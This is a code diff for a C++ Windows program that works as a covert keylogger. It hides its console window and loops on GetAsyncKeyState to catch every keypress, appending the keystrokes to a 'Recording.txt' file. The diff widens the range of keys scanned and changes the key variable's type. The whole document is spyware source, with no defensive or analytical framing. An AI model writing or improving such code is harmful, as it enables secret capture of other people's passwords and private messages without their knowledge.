@@ -5,6 +5,8 @@
 
 using namespace std;
 
+//mapvirtualkey()
+
 void hideConsoleWindow() {
 	HWND consoleWindow;
 	AllocConsole();
@@ -15,11 +17,11 @@ void hideConsoleWindow() {
 int main(int argc, char* argv[]) {
 	hideConsoleWindow();
 
-	char pressedKey;
+	unsigned char pressedKey;
 	ofstream log("Recording.txt", ios::app);
 	while (true) {
 		Sleep(0);
-		for (pressedKey = 8; pressedKey <= 127; pressedKey++){
+		for (pressedKey = 8; pressedKey <= VK_OEM_7; pressedKey++){
 			if (GetAsyncKeyState(pressedKey) == -32767){
 
 				if (GetAsyncKeyState(VK_SHIFT))
